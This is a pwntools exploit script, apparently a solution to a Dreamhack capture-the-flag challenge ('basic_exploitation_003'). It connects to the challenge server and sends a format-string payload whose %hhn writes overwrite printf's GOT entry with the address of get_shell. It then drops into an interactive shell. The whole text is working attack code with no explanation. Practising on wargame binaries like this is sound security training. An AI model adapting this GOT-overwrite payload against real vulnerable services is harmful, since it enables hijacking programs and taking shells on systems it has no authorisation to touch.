from pwn import *

r = remote("host8.dreamhack.games", 23137)
e = ELF("/mnt/c/Users/Storm/ctf/basic_exploitation_003")

get_shell = e.symbols['get_shell']
printf_got = e.got['printf']

get_shell = p32(get_shell)

payload = p32(printf_got)
payload += p32(printf_got + 1)

payload += f"%{get_shell[0] - 8}c".encode() + b"%1$hhn"
payload += f"%{get_shell[1] - get_shell[0]}c".encode() + b"%2$hhn"

r.send(payload)

r.interactive()